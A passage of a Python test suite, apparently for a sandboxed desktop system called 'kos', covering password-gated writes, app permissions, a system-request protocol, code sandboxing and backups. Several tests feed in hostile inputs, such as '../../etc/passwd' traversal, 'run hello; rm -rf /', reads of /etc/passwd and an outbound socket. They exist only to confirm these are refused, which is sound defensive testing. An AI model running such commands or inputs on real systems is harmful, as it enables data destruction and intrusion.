        self.assertEqual([e["pending"] for e in self.ledger.owed()], [["optimize"]])   # scan done, optimize owed
        with self.assertRaises(AdminError) as ctx:
            self.write("d2.txt", b"x", answers=())                 # refused before any password
        self.assertIn("still owes: optimize", str(ctx.exception))
        self.assertFalse((self.out / "d2.txt").exists())
        from kos.admin import settle
        lines = settle(self.paths, self.authority(PW))
        self.assertTrue(any("settled" in l for l in lines))
        self.assertEqual(self.ledger.owed(), [])
        self.write("d2.txt", b"x")                                 # unblocked
        self.assertTrue((self.out / "d2.txt").exists())

    def test_a_crash_between_write_and_scan_is_remembered_across_restarts(self):
        from kos.requires import Ledger
        self.ledger.owe("file.write", str(self.out / "e.txt"))      # as if we died right after writing
        self.assertEqual(Ledger(self.paths).owed()[0]["pending"], ["scan", "optimize"])
        with self.assertRaises(AdminError):
            self.write("f.txt", b"x", answers=())

    def test_one_password_covers_scan_optimize_and_write(self):
        """The write's password also pays for the optimize (it re-seals apps),
        so the whole pipeline asks exactly once."""
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        r = self.write("d.txt", b"hello")                # authority(PW) has a single answer
        self.assertEqual((self.out / "d.txt").read_bytes(), b"hello")
        self.assertTrue(r.scan.clean)

    def test_refused_without_a_booted_keyboard_before_any_password(self):
        self.kb_.shutdown()
        with self.assertRaises(AdminError):
            self.write("e.txt", b"x", answers=())        # a prompt here would AssertionError
        self.assertFalse((self.out / "e.txt").exists())

    def test_wrong_password_writes_nothing(self):
        with self.assertRaises(AuthorizationDenied):
            self.write("f.txt", b"x", answers=("no", "no", "no"))
        self.assertFalse((self.out / "f.txt").exists())

    def test_kos_system_state_symlinks_and_directories_are_refused(self):
        self.paths.ensure()
        for target in (self.paths.state / "evil", self.paths.etc / "auth.json"):
            with self.assertRaises(AdminError):
                write_file(self.paths, self.authority(PW), self.kb_, str(target), b"x")
        (self.out / "link").symlink_to(self.out / "real")
        with self.assertRaises(AdminError):
            self.write("link", b"x")
        with self.assertRaises(AdminError):
            write_file(self.paths, self.authority(PW), self.kb_,
                       str(self.out / "nodir" / "f"), b"x")

    def test_forged_lease_is_refused_even_with_the_right_password(self):
        doc = json.loads(self.kb_.file.read_text())
        doc["keyboards"] = ["/dev/input/event99"]
        self.kb_.file.write_text(json.dumps(doc))
        with self.assertRaises(AdminError):
            self.write("g.txt", b"x")
        self.assertFalse((self.out / "g.txt").exists())

    def test_cli_write_refuses_with_exit_2_when_keyboard_not_booted(self):
        with tempfile.TemporaryDirectory() as d, mock.patch.dict(os.environ, {"KOS_ROOT": d}):
            code = kcli.main(["write", os.path.join(d, "x.txt"), "--text", "hi"])
            self.assertEqual(code, 2)
            self.assertFalse(os.path.exists(os.path.join(d, "x.txt")))
            self.assertEqual(kcli.main(["admin"]), 0)


def AuditLogFor(paths):
    from kos.auth import AuditLog
    return AuditLog(paths).entries()


# ---------------------------------------------------------------------------
# The desktop: everything is an app
# ---------------------------------------------------------------------------
import signal as _signal  # noqa: E402
import time as _time  # noqa: E402
from kos.desktop import Desktop, DesktopError, SYSTEM_APPS  # noqa: E402
from kos.system import SystemBridge, close_instance, list_apps, open_background  # noqa: E402
from kos.tui import TUISurface  # noqa: E402

SYSTEM_DIR = Path(__file__).resolve().parent.parent / "examples" / "system"


def _keys(text):
    return [{"type": "key", "key": c} for c in text]


ENTER = {"type": "key", "key": "enter"}


class TestRequestProtocol(unittest.TestCase):
    def test_valid_requests_pass_in_every_mode(self):
        for mode in ("tui", "graphical", "cmd"):
            self.assertEqual(validate_app_message({"cmd": "request", "action": "apps"}, mode)["action"], "apps")
            self.assertEqual(validate_app_message(
                {"cmd": "request", "action": "open", "app": "hello", "mode": "graphical"}, mode)["mode"],
                "graphical")
            validate_app_message({"cmd": "request", "action": "focus", "id": "hello-3fa9c1"}, mode)

    def test_hostile_requests_are_rejected(self):
        for bad in ({"cmd": "request", "action": "open", "app": "../../etc/passwd"},
                    {"cmd": "request", "action": "open", "app": "hello", "mode": "root"},
                    {"cmd": "request", "action": "focus", "id": "a/b"},
                    {"cmd": "request", "action": "close", "id": "hello"},
                    {"cmd": "request", "action": "format-disk"},
                    {"cmd": "request"}):
            with self.assertRaises(ProtocolError, msg=bad):
                validate_app_message(bad, "tui")

    def test_old_instance_records_without_the_system_flag_still_load(self):
        with tempfile.TemporaryDirectory() as d:
            reg = Registry(Paths(Path(d)))
            reg.dir.mkdir(parents=True)
            (reg.dir / "old-aaaaaa.json").write_text(json.dumps(
                {"id": "old-aaaaaa", "name": "old", "mode": "tui", "broker_pid": os.getpid(),
                 "sock_path": "/x", "log_path": "/y", "started": 0, "app_pid": 1,
                 "status": "running"}))
            self.assertFalse(reg.get("old-aaaaaa").system)


class TestSystemApps(Env):
    def test_system_apps_pack_scan_clean_and_ask_for_the_system_permission(self):
        for name in SYSTEM_APPS:
            out = Path(self.tmp.name) / f"{name}.kapp"
            m = pack(SYSTEM_DIR / name, out)
            self.assertEqual(m.name, name)
            self.assertIn("system", m.permissions)
            self.assertTrue(scan_bytes(out.read_bytes(), name).clean)

    def test_an_app_cannot_claim_a_permission_that_does_not_exist(self):
        with self.assertRaises(KAppError):
            from kos.kapp import Manifest
            Manifest.parse(json.dumps({"name": "x", "version": "1", "runtime": "python",
                                       "entry": "a", "permissions": ["root"]}).encode())


class TestSystemBridge(Env):
    def setUp(self):
        super().setUp()
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        self.sent, self.spawned = [], []

    def spawner(self, inst, app, mode, policy, registry, log_path, cache_dir=None):
        self.spawned.append((inst.name, mode))
        inst.status, inst.broker_pid = "running", os.getpid()
        registry.write(inst)

    def ask(self, req, *answers):
        bridge = SystemBridge(self.paths, spawner=self.spawner)
        switch = bridge.handle(req, self.sent.append, self.authority(*answers))
        return switch, self.sent[-1]

    def test_apps_lists_installed_with_permit_state_and_needs_no_password(self):
        _, reply = self.ask({"cmd": "request", "action": "apps"})
        self.assertEqual(reply["cmd"], "apps")
        self.assertEqual([(a["name"], a["permitted"]) for a in reply["installed"]], [("hello", False)])
        PermitStore(self.paths).grant("hello")
        self.assertTrue(list_apps(self.paths)[0]["permitted"])

    def test_open_is_refused_without_permit_and_never_asks_for_a_password(self):
        _, reply = self.ask({"cmd": "request", "action": "open", "app": "hello", "mode": "tui"})
        self.assertFalse(reply["ok"])
        self.assertIn("permission to run", reply["detail"])
        self.assertEqual(self.spawned, [])

    def test_open_needs_the_password_and_wrong_password_opens_nothing(self):
        PermitStore(self.paths).grant("hello")
        req = {"cmd": "request", "action": "open", "app": "hello", "mode": "tui"}
        _, reply = self.ask(req, "no", "no", "no")
        self.assertFalse(reply["ok"])
        self.assertEqual(self.spawned, [])
        _, reply = self.ask(req, PW)
        self.assertTrue(reply["ok"])
        self.assertEqual(self.spawned, [("hello", "tui")])
        self.assertRegex(reply["id"], r"^hello-[0-9a-f]{6}$")
        self.assertEqual(Registry(self.paths).get(reply["id"]).status, "running")

    def test_open_cannot_start_a_mode_the_app_does_not_have(self):
        PermitStore(self.paths).grant("hello")
        _, reply = self.ask({"cmd": "request", "action": "open", "app": "web", "mode": "tui"}, PW)
        self.assertFalse(reply["ok"])                       # not installed
        self.assertEqual(self.spawned, [])

    def test_focus_switches_only_to_a_running_instance(self):
        Registry(self.paths).write(Instance(id="hello-aaaaaa", name="hello", mode="tui",
                                            broker_pid=os.getpid(), sock_path="/x", log_path="/y",
                                            started=0, status="running"))
        switch, reply = self.ask({"cmd": "request", "action": "focus", "id": "hello-aaaaaa"})
        self.assertEqual(switch, ("instance", "hello-aaaaaa"))
        self.assertTrue(reply["ok"])
        switch, reply = self.ask({"cmd": "request", "action": "focus", "id": "hello-bbbbbb"})
        self.assertIsNone(switch)
        self.assertFalse(reply["ok"])

    def test_close_needs_the_password(self):
        Registry(self.paths).write(Instance(id="hello-cccccc", name="hello", mode="tui",
                                            broker_pid=999999999, sock_path="/x", log_path="/y",
                                            started=0, status="exited"))
        req = {"cmd": "request", "action": "close", "id": "hello-cccccc"}
        _, reply = self.ask(req, "no", "no", "no")
        self.assertFalse(reply["ok"])
        self.assertEqual(len(Registry(self.paths).list()), 1)
        _, reply = self.ask(req, PW)
        self.assertTrue(reply["ok"])
        self.assertEqual(Registry(self.paths).list(), [])


class DesktopSessionEnv(Env):
    """Runs a real sandboxed app in a Session against scripted devices."""

    def start(self, kapp_dir, name, mode="tui", *, bridge=None, authority=None, **kw):
        kapp = Path(self.tmp.name) / f"{name}.kapp"
        pack(kapp_dir, kapp)
        store = AppStore(self.paths)
        store.install(kapp, self.authority(PW))
        PermitStore(self.paths).grant(name)
        with self.authority(PW).authorize("app.run", name) as g:
            app = store.load_verified(name, g)
        a, b = socket.socketpair()
        proc = loader.launch(loader.plan(app, b.fileno(), mode), SandboxPolicy(), None)
        b.close()
        self.devices = ScriptedDevices()
        self.outfile = tempfile.TemporaryFile()
        self.addCleanup(self.outfile.close)
        surface = (CmdSurface(self.outfile.fileno(), 100, 30, name) if mode == "cmd"
                   else TUISurface(self.outfile.fileno(), 100, 30, name))
        auth = authority or Authority(self.paths, None, Throttle(self.paths, base=0))
        self.outcome = {}
        self.session = Session(name=name, mode=mode, channel=Channel(a), proc=proc, surface=surface,
                               devices=self.devices, authority=auth, bridge=bridge,
                               outcome=self.outcome, **kw)
        return self.session

    def output(self):
        self.outfile.seek(0)
        return self.outfile.read().decode(errors="replace")

    def when_modal(self, needle, then, timeout=15):
        """Push `then` once the OS's trusted prompt mentioning `needle` is on screen."""
        def watch():
            end = _time.monotonic() + timeout
            while _time.monotonic() < end:
                m = self.session.surface.modal
                if m is not None and needle in m.title:
                    self.devices.push(*then)
                    return
                _time.sleep(0.02)
        t = threading.Thread(target=watch, daemon=True)
        t.start()
        return t

    def boot_both(self):
        self.devices.push(*_keys("y"), *_keys(PW), ENTER, *_keys("y"), *_keys(PW), ENTER)


class TestDesktopSessions(DesktopSessionEnv):
    def test_app_without_system_permission_is_told_no(self):
        # run the real taskbar but hand the session NO bridge
        s = self.start(SYSTEM_DIR / "taskbar", "taskbar")
        self.boot_both()
        threading.Timer(2.5, lambda: self.devices.push({"type": "interrupt"})).start()
        s.run(first_frame_timeout=1.0)
        self.assertIn("does not have the 'system' permission", self.output())

    def test_taskbar_lists_running_apps_and_asks_the_os_to_switch(self):
        Registry(self.paths).write(Instance(id="hello-aaaaaa", name="hello", mode="tui",
                                            broker_pid=os.getpid(), sock_path="/x", log_path="/y",
                                            started=0, status="running"))
        s = self.start(SYSTEM_DIR / "taskbar", "taskbar", bridge=SystemBridge(self.paths))
        self.boot_both()
        threading.Timer(2.5, lambda: self.devices.push(*_keys("1"))).start()
        s.run(first_frame_timeout=1.0)
        self.assertIn("hello-aaaaaa", self.output())             # the taskbar drew the open app
        self.assertEqual(self.outcome["switch"], ("instance", "hello-aaaaaa"))

    def test_right_mouse_opens_the_app_library_and_the_app_never_sees_it(self):
        s = self.start(EXAMPLE, "hello", "cmd", right_click_to="library-aaaaaa")
        self.boot_both()
        left = {"type": "button", "button": "left", "pressed": True, "x": 1, "y": 1}
        right = {"type": "button", "button": "right", "pressed": True, "x": 1, "y": 1}
        self.devices.push(left, right)
        s.run(first_frame_timeout=0.5)
        self.assertEqual(self.outcome["switch"], ("instance", "library-aaaaaa"))
        out = self.output()
        self.assertIn('"button":"left"', out)                    # ordinary clicks still reach the app
        self.assertNotIn('"button":"right"', out)                # the right button is the OS's

    def test_devices_booted_by_the_desktop_carry_over_with_no_new_prompt(self):
        s = self.start(EXAMPLE, "hello", "cmd", preboot=("mouse", "keyboard"))
        self.devices.push(*_keys("x"), {"type": "interrupt"})   # no y/password anywhere
        s.run(first_frame_timeout=0.5)
        self.assertEqual(self.devices.booted, ["mouse", "keyboard"])
        out = self.output()
        self.assertIn('"state":"attached"', out)
        self.assertIn('"cmd":"key","key":"x"', out)              # keys flow immediately
        self.assertEqual(sorted(self.outcome["booted"]), ["keyboard", "mouse"])

    def test_app_library_opens_an_app_with_a_password_typed_in_the_os_prompt(self):
        """The whole chain, with real processes: the App Library (sandboxed
        app) asks -> the OS prompts for the password in its own overlay ->
        the OS verifies the seal and starts hello under a real broker ->
        the library asks to switch -> the session ends pointing at it."""
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        PermitStore(self.paths).grant("hello")
        auth = Authority(self.paths, None, Throttle(self.paths, base=0))
        s = self.start(SYSTEM_DIR / "app-library", "app-library",
                       bridge=SystemBridge(self.paths), authority=auth)
        self.boot_both()
        # the library draws "hello" (the only non-system app); Enter asks to open it
        threading.Timer(3.0, lambda: self.devices.push(ENTER)).start()
        self.when_modal("Password to open app", [*_keys(PW), ENTER])
        threading.Timer(25.0, lambda: self.devices.push({"type": "interrupt"})).start()
        s.run(first_frame_timeout=1.0)
        self.assertIn("hello", self.output())
        switch = self.outcome["switch"]
        self.assertIsNotNone(switch, "library never asked to switch to the app it opened")
        self.assertRegex(switch[1], r"^hello-[0-9a-f]{6}$")
        self.assertEqual(Registry(self.paths).get(switch[1]).status, "running")
        granted = [(e["action"], e["target"]) for e in auth.audit.entries() if e["outcome"] == "granted"]
        self.assertIn(("app.open", "hello"), granted)

    def tearDown(self):
        # Must run BEFORE Env.tearDown deletes the registry (addCleanup runs
        # after tearDown, by which point there is nothing left to find).
        self._kill_brokers()
        super().tearDown()

    def _kill_brokers(self):
        for inst in Registry(self.paths).list():
            if inst.broker_pid == os.getpid():
                continue            # a fake record some test wrote pointing at itself
            try:
                os.kill(inst.broker_pid, _signal.SIGTERM)
            except (ProcessLookupError, PermissionError):
                pass
        for _ in range(50):
            if not [i for i in Registry(self.paths).list() if i.broker_pid != os.getpid()]:
                break
            _time.sleep(0.1)


class TestDesktopNavigation(unittest.TestCase):
    def run_desktop(self, script, home="taskbar-111111", library="library-222222"):
        calls = []

        def attach(target, ctx):
            calls.append((target, dict(ctx)))
            step = script.pop(0)
            if isinstance(step, Exception):
                raise step
            return step

        return Desktop(home, library, attach).run(), calls

    def test_starts_on_the_taskbar_and_ctrl_c_there_leaves(self):
        code, calls = self.run_desktop([{"exit_code": 0}])
        self.assertEqual(code, 0)
        self.assertEqual([c[0] for c in calls], ["taskbar-111111"])
        self.assertEqual(calls[0][1]["right_click_to"], "library-222222")

    def test_ctrl_c_in_an_app_returns_to_the_taskbar_not_out_of_the_desktop(self):
        code, calls = self.run_desktop([
            {"switch": ("instance", "hello-333333"), "booted": ["mouse", "keyboard"]},
            {"switch": None},            # Ctrl-C inside hello -> back home
            {"exit_code": 0}])           # Ctrl-C on the taskbar -> leave
        self.assertEqual([c[0] for c in calls], ["taskbar-111111", "hello-333333", "taskbar-111111"])
        self.assertEqual(calls[1][1]["preboot"], ("mouse", "keyboard"))   # devices carried over
        self.assertEqual(calls[2][1]["preboot"], ("mouse", "keyboard"))

    def test_right_mouse_target_is_the_library_but_not_while_in_the_library(self):
        _, calls = self.run_desktop([
            {"switch": ("instance", "library-222222")}, {"switch": None}, {"exit_code": 0}])
        self.assertEqual(calls[1][0], "library-222222")
        self.assertIsNone(calls[1][1]["right_click_to"])

    def test_vanished_app_falls_back_home_but_vanished_taskbar_is_an_error(self):
        _, calls = self.run_desktop([
            {"switch": ("instance", "hello-333333")}, KAppError("gone"), {"exit_code": 0}])
        self.assertEqual([c[0] for c in calls], ["taskbar-111111", "hello-333333", "taskbar-111111"])
        with self.assertRaises(DesktopError):
            self.run_desktop([KAppError("gone")])


class TestLoginBootsAdminKeyboard(AdminEnv):
    def test_one_password_unlocks_and_boots_it_and_locking_drops_it(self):
        import kos.init as kinit
        prompter = ScriptedPrompter([PW])               # exactly one password for the whole login
        lease = self.paths.state / "admin-lease.json"
        seen = {}

        def fake_shell(console):
            seen["lease_while_shell_runs"] = lease.exists()
            seen["shell"] = kinit.shell_argv()
            return 0

        with mock.patch.object(kinit, "TTYPrompter", lambda console: prompter), \
                mock.patch.object(kinit, "AdminKeyboard", lambda paths: self.kb()), \
                mock.patch.object(kinit, "start_shell", fake_shell), \
                mock.patch.object(kinit.time, "sleep", lambda s: None):
            with self.assertRaises(AssertionError):     # the 2nd login asks again: the script has no answer
                kinit.login_loop(self.paths, "/dev/null")
        self.assertTrue(seen["lease_while_shell_runs"])
        self.assertFalse(lease.exists())                # locked: nothing elevated survives
        self.assertTrue(any("Administrator keyboard booted" in m for m in prompter.messages))
        self.assertEqual(seen["shell"], ["/opt/kos/bin/kos", "line"])   # login starts the line shell

    def test_unlock_requires_the_keyboard_which_requires_the_kernel(self):
        import kos.init as kinit
        prompter = ScriptedPrompter([PW])
        shells = []
        no_kernel = lambda paths: self.kb(kernel_report=lambda: {"landlock_abi": 0})

        with mock.patch.object(kinit, "TTYPrompter", lambda console: prompter), \
                mock.patch.object(kinit, "AdminKeyboard", no_kernel), \
                mock.patch.object(kinit, "start_shell", lambda c: shells.append(1) or 0), \
                mock.patch.object(kinit.time, "sleep", lambda s: None):
            with self.assertRaises(AssertionError):            # it asks again: still locked
                kinit.login_loop(self.paths, "/dev/null")
        self.assertEqual(shells, [])                            # the shell NEVER started
        self.assertFalse((self.paths.state / "admin-lease.json").exists())
        self.assertTrue(any("session.unlock requires admin.keyboard requires kernel" in m
                            for m in prompter.messages), prompter.messages)


class TestRequires(Env):
    def test_chain_is_followed_deepest_first_and_named_when_it_fails(self):
        from kos.requires import Requirements, Unsatisfied
        log = []
        state = {"kernel": False, "kb": False}
        engine = Requirements(
            {"kernel": lambda: None if state["kernel"] else "no kernel",
             "admin.keyboard": lambda: None if state["kb"] else "keyboard off"},
            {"admin.keyboard": lambda: (log.append("boot kb"), state.update(kb=True))})
        with self.assertRaises(Unsatisfied) as ctx:
            engine.ensure("session.unlock")
        self.assertEqual(ctx.exception.chain, ["session.unlock", "admin.keyboard", "kernel"])
        self.assertEqual(str(ctx.exception), "session.unlock requires admin.keyboard requires kernel: no kernel")
        self.assertEqual(log, [])                    # the keyboard was never booted without the kernel
        state["kernel"] = True
        self.assertEqual(engine.ensure("session.unlock"), ["admin.keyboard"])
        self.assertEqual(log, ["boot kb"])
        self.assertEqual(engine.ensure("session.unlock"), [])      # already up: nothing to boot

    def test_circular_requirements_are_refused(self):
        from kos.requires import Requirements, Rule, Unsatisfied
        engine = Requirements({}, rules={"a": Rule(before=("b",)), "b": Rule(before=("a",))})
        with self.assertRaises(Unsatisfied):
            engine.ensure("a")

    def test_unreadable_ledger_blocks_instead_of_freeing(self):
        from kos.requires import Ledger
        led = Ledger(self.paths)
        self.paths.ensure()
        led.file.write_text("{not json")
        self.assertTrue(led.owed())


class TestCodeIsACommand(Env):
    """A line of code is a command - run as a sandboxed one-shot app."""

    def run_line(self, code, language="python", *answers, **kw):
        from kos.coderun import run_code
        out = []
        status = run_code(self.paths, lambda: self.authority(*answers), code, language,
                          out=out.append, **kw)
        return status, "\n".join(out)

    def test_python_line_runs_in_the_sandbox_after_the_password(self):
        status, out = self.run_line("print(6 * 7)", "code call", PW)
        self.assertEqual((status, out.strip()), (0, "42"))
        self.assertIn(("code.run", "granted"),
                      [(e["action"], e["outcome"]) for e in AuditLogFor(self.paths)])

    def test_wrong_password_runs_nothing(self):
        with self.assertRaises(AuthorizationDenied):
            self.run_line("print('x')", "code call", "no", "no", "no")

    def test_the_sandbox_holds_for_code_lines(self):
        _, out = self.run_line("p = '/etc/' + 'pass' + 'wd'; print(open(p).read())", "python", PW)
        self.assertIn("PermissionError", out)
        self.assertNotIn("root:", out)
        _, out = self.run_line("open('/tmp/kos-codeline-pwned', 'w').write('x')", "code call", PW)
        self.assertIn("PermissionError", out)
        self.assertFalse(os.path.exists("/tmp/kos-codeline-pwned"))
        _, out = self.run_line("import socket; socket.create_connection(('1.1.1.1', 80), 2)", "python", PW)
        self.assertIn("Error", out)

    def test_runaway_line_is_stopped(self):
        status, out = self.run_line("while True: pass", "python", PW, timeout=1.5)
        self.assertEqual(status, 124)
        self.assertIn("ran longer", out)

    def test_flagged_code_is_blocked_before_the_password(self):
        status, out = self.run_line("x = '" + EICAR.decode() + "'", "assignment")   # no answers: no prompt
        self.assertEqual(status, 3)
        self.assertIn("security scan", out)

    def test_language_without_a_runtime_is_a_command_that_runs_nothing(self):
        status, out = self.run_line("const a = 1", "javascript")                    # no password asked
        self.assertEqual(status, 66)
        self.assertIn("no sandboxed javascript runtime", out)
        status, out = self.run_line("run hello; rm -rf /", "shell")
        self.assertEqual(status, 66)

    def test_nothing_persists_between_lines(self):
        self.run_line("x = 5", "assignment", PW)
        _, out = self.run_line("print(x)", "code call", PW)
        self.assertIn("NameError", out)


class TestSystemRequestsProtocol(unittest.TestCase):
    def test_new_requests_validate(self):
        for ok in ({"action": "info"}, {"action": "optimize"}, {"action": "settle"},
                   {"action": "ls", "path": "/tmp"}, {"action": "view", "path": "/tmp/x"},
                   {"action": "scan", "path": "a.kapp"}, {"action": "permit", "app": "hello"},
                   {"action": "revoke", "app": "hello"}, {"action": "line", "text": "lista"}):
            self.assertEqual(validate_app_message({"cmd": "request", **ok}, "tui")["action"], ok["action"])

    def test_hostile_values_are_rejected_or_cleaned(self):
        for bad in ({"action": "ls", "path": ""}, {"action": "ls", "path": "a\x00b"},
                    {"action": "view", "path": "x" * 2000}, {"action": "ls", "path": 5},
                    {"action": "permit", "app": "../x"}):
            with self.assertRaises(ProtocolError, msg=bad):
                validate_app_message({"cmd": "request", **bad}, "tui")
        line = validate_app_message({"cmd": "request", "action": "line", "text": "ru\x1b[2Jn"}, "tui")
        self.assertNotIn("\x1b", line["text"])


class TestSystemBridgeActions(Env):
    def setUp(self):
        super().setUp()
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        self.sent = []
        self.work = Path(self.tmp.name) / "work"
        self.work.mkdir()

    def ask(self, req, *answers):
        bridge = SystemBridge(self.paths)
        bridge.handle({"cmd": "request", **req}, self.sent.append, self.authority(*answers))
        return self.sent[-1]

    def test_info_reports_admin_kernel_owed_audit_and_permits(self):
        PermitStore(self.paths).grant("hello")
        r = self.ask({"action": "info"})
        self.assertEqual(r["cmd"], "info")
        self.assertIn("OFF", r["admin"])
        self.assertTrue(any("Landlock" in l for l in r["kernel"]))
        self.assertEqual(r["owed"], ["nothing is owed"])
        self.assertTrue(any("app.install" in l for l in r["audit"]))
        self.assertEqual(r["permits"], ["hello"])

    def test_ls_lists_folders_and_inside_zips_without_extracting(self):
        (self.work / "sub").mkdir()
        (self.work / "a.txt").write_text("hi")
        (self.work / "app.kapp").write_bytes(self.kapp.read_bytes())
        r = self.ask({"action": "ls", "path": str(self.work)})
        self.assertEqual([(e["name"], e["kind"]) for e in r["entries"]],
                         [("app.kapp", "zip"), ("sub", "dir"), ("a.txt", "file")])
        r = self.ask({"action": "ls", "path": str(self.work / "app.kapp")})
        self.assertIn("manifest.json", [e["name"] for e in r["entries"]])
        self.assertFalse((self.work / "manifest.json").exists())      # nothing was extracted

    def test_view_needs_the_password_and_strips_terminal_escapes(self):
        f = self.work / "n.txt"
        f.write_text("hello\n\x1b[2Jevil\n")
        r = self.ask({"action": "view", "path": str(f)}, "no", "no", "no")
        self.assertFalse(r["ok"])                                      # wrong password: no text at all
        r = self.ask({"action": "view", "path": str(f)}, PW)
        self.assertEqual(r["cmd"], "text")
        self.assertEqual(r["lines"][0], "hello")
        self.assertNotIn("\x1b", "".join(r["lines"]))

    def test_scan_flags_a_file_with_no_password(self):
        bad, ok = self.work / "bad.txt", self.work / "ok.txt"
        bad.write_bytes(EICAR)
        ok.write_text("fine")
        self.assertIn("FLAGGED", self.ask({"action": "scan", "path": str(bad)})["lines"][0])
        self.assertIn("clean", self.ask({"action": "scan", "path": str(ok)})["lines"][0])

    def test_optimize_and_settle_each_need_the_password(self):
        r = self.ask({"action": "optimize"}, "no", "no", "no")
        self.assertFalse(r["ok"])
        r = self.ask({"action": "optimize"}, PW)
        self.assertIn("reclaimed", r["lines"][0])
        from kos.requires import Ledger
        Ledger(self.paths).owe("file.write", str(self.work / "x"))
        r = self.ask({"action": "settle"}, PW)
        self.assertEqual(Ledger(self.paths).owed(), [])
        self.assertTrue(any("settled" in l for l in r["lines"]))

    def test_permit_and_revoke_need_the_password_and_an_installed_app(self):
        self.assertFalse(self.ask({"action": "permit", "app": "ghost"}, PW)["ok"])
        self.assertFalse(self.ask({"action": "permit", "app": "hello"}, "no", "no", "no")["ok"])
        self.assertFalse(PermitStore(self.paths).is_permitted("hello"))
        self.assertTrue(self.ask({"action": "permit", "app": "hello"}, PW)["ok"])
        self.assertTrue(PermitStore(self.paths).is_permitted("hello"))
        self.assertTrue(self.ask({"action": "revoke", "app": "hello"}, PW)["ok"])
        self.assertFalse(PermitStore(self.paths).is_permitted("hello"))

    def test_line_runs_the_line_shell_inside_the_desktop(self):
        lines = lambda text, *a: self.ask({"action": "line", "text": text}, *a)["lines"]
        self.assertTrue(any("hello" in l and "needs: permit" in l for l in lines("lista")))
        self.assertEqual(lines("permite hello", PW), ["hello may now run"])
        self.assertTrue(any("hello" in l and "permitted" in l for l in lines("list")))
        self.assertIn("nothing is owed", lines("owed")[0])
        self.assertTrue(any("Landlock" in l for l in lines("doctor")))
        self.assertTrue(any("don't know" in l for l in lines("bonjour")))
        self.assertTrue(any("real terminal" in l for l in lines("write a.txt hi")))
        self.assertTrue(any("real terminal" in l for l in lines("run hello")))

    def test_line_runs_code_as_a_sandboxed_command_and_shell_glue_runs_nothing(self):
        out = self.ask({"action": "line", "text": "print(6 * 7)"}, PW)["lines"]
        self.assertIn("42", out)
        out = self.ask({"action": "line", "text": "run hello; rm -rf /"})["lines"]
        self.assertTrue(any("no sandboxed shell runtime" in l for l in out))


class TestSystemAppsRunForReal(DesktopSessionEnv):
    """Each built-in app, as a real sandboxed process, against scripted input."""

    def go(self, name, push_after=2.5, keys=(), wait=6.0):
        s = self.start(SYSTEM_DIR / name, name, bridge=SystemBridge(self.paths))
        self.boot_both()
        if keys:
            threading.Timer(push_after, lambda: self.devices.push(*keys)).start()
        threading.Timer(wait, lambda: self.devices.push({"type": "interrupt"})).start()
        s.run(first_frame_timeout=1.0)
        return self.output()

    def test_security_center_shows_the_admin_keyboard_kernel_and_owed(self):
        out = self.go("security")
        for needle in ("Security Center", "Administrator keyboard", "OFF", "Kernel protections",
                       "Landlock ABI", "nothing is owed", "Recent decisions"):
            self.assertIn(needle, out)

    def test_settings_lists_apps_and_toggles_permission_with_a_password(self):
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        s = self.start(SYSTEM_DIR / "settings", "settings", bridge=SystemBridge(self.paths),
                       authority=Authority(self.paths, None, Throttle(self.paths, base=0)))
        self.boot_both()
        threading.Timer(3.0, lambda: self.devices.push(ENTER)).start()      # first app = hello
        self.when_modal("Password to give app permission", [*_keys(PW), ENTER])
        threading.Timer(9.0, lambda: self.devices.push({"type": "interrupt"})).start()
        s.run(first_frame_timeout=1.0)
        out = self.output()
        self.assertIn("Kernel protections", out)
        self.assertIn("NOT permitted", out)
        self.assertTrue(PermitStore(self.paths).is_permitted("hello"))

    def test_files_browses_the_filesystem_by_asking_the_os(self):
        out = self.go("files")
        self.assertIn("Files", out)
        self.assertIn("etc/", out)

    def test_terminal_runs_a_plain_language_line(self):
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        out = self.go("terminal", keys=[*_keys("lista"), ENTER])
        self.assertIn("kos> lista", out)
        self.assertIn("needs: permit", out)

    def test_terminal_runs_a_code_line_in_the_sandbox_after_the_prompt(self):
        s = self.start(SYSTEM_DIR / "terminal", "terminal", bridge=SystemBridge(self.paths),
                       authority=Authority(self.paths, None, Throttle(self.paths, base=0)))
        self.boot_both()
        threading.Timer(2.5, lambda: self.devices.push(*_keys("print(6*7)"), ENTER)).start()
        self.when_modal("Password to run code", [*_keys(PW), ENTER])
        threading.Timer(9.0, lambda: self.devices.push({"type": "interrupt"})).start()
        s.run(first_frame_timeout=1.0)
        out = self.output()
        self.assertIn("kos> print(6*7)", out)
        self.assertRegex(out, r"\b42\b")


from kos import backup as kbackup  # noqa: E402


class TestFileRequestsProtocol(unittest.TestCase):
    def test_valid_file_requests(self):
        v = lambda **m: validate_app_message({"cmd": "request", **m}, "tui")
        self.assertEqual(v(action="save", path="/tmp/a", text="line1\nline2\n\tindented")["action"], "save")
        self.assertEqual(v(action="backup", path="/tmp/docs")["path"], "/tmp/docs")
        self.assertEqual(v(action="backups")["action"], "backups")
        self.assertEqual(v(action="restore", backup="docs-20260101-000000.zip",
                           member="docs/a.txt", to="/tmp/a.txt")["member"], "docs/a.txt")

    def test_hostile_file_requests_are_rejected(self):
        v = lambda **m: validate_app_message({"cmd": "request", **m}, "tui")
        for bad in (dict(action="save", path="/tmp/a", text="x\x1b[2Jy"), dict(action="save", path="/tmp/a", text="x\x00y"),
                    dict(action="save", path="/tmp/a", text="x" * (300 << 10)), dict(action="save", path="", text="x"),
                    dict(action="save", path="/tmp/a", text=5),
                    dict(action="restore", backup="../etc/passwd", member="a", to="/tmp/a"),
                    dict(action="restore", backup="x.zip", member="", to="/tmp/a"),
                    dict(action="backup", path="a\x00b")):
            with self.assertRaises(ProtocolError, msg=bad):
                v(**bad)


class TestBackup(AdminEnv):
    def setUp(self):
        super().setUp()
        self.docs = Path(self.tmp.name) / "docs"
        (self.docs / "sub").mkdir(parents=True)
        (self.docs / "a.txt").write_text("alpha")
        (self.docs / "sub" / "b.txt").write_text("beta")
        (self.docs / "link").symlink_to("/etc/hostname")

    def test_backup_of_a_folder_is_a_zip_that_is_never_extracted(self):
        info = kbackup.create(self.paths, self.authority(PW), str(self.docs))
        self.assertEqual(info["files"], 2)                         # the symlink was skipped
        self.assertRegex(info["name"], r"^docs-\d{8}-\d{6}\.zip$")
        z = zipfile.ZipFile(info["path"])
        self.assertEqual(sorted(z.namelist()), ["docs/a.txt", "docs/sub/b.txt"])
